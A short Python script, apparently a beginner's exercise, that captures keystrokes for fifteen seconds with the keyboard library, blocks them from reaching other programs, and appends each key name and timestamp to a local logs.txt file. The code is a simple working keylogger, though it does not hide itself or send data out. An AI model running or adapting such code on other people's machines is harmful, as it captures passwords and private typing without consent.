import os
import tkinter as tk
from tkinter import messagebox
import sqlite3
import keyboard  # for keylogs
from datetime import datetime
import time

start_time = time.time()
duration = 15  # in seconds, 60 means 1 minute and so on

button = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
          'v', 'w', 'x', 'y', 'z']

# Write contents to_file
def report(logs):
    """
    Writes the contents of the keyboard logs to a text file named 'logs.txt'.
    """
    file_path = os.path.join(os.getcwd(), 'logs.txt')
    with open(file_path, 'a') as f:  # Use 'a' (append) mode to add to the file
        f.write(logs)

while True:
    elapsed_time = time.time() - start_time
    if elapsed_time >= duration:
        print("Counter reached {} seconds.".format(duration))
        break
    # start capturing keyboard input
    ybutton = keyboard.read_event(suppress=True)
    # Convert the keyboard event to a string (you can format it as needed)
    log_entry = f"Key: {ybutton.event_type}, Name: {ybutton.name}, Time: {time.time()}\n"
    # start reporting the keylogs
    report(log_entry)
    print("Elapsed time: {:.2f} seconds".format(elapsed_time))
    time.sleep(1)  # wait 1 second

print("Counter finished.")
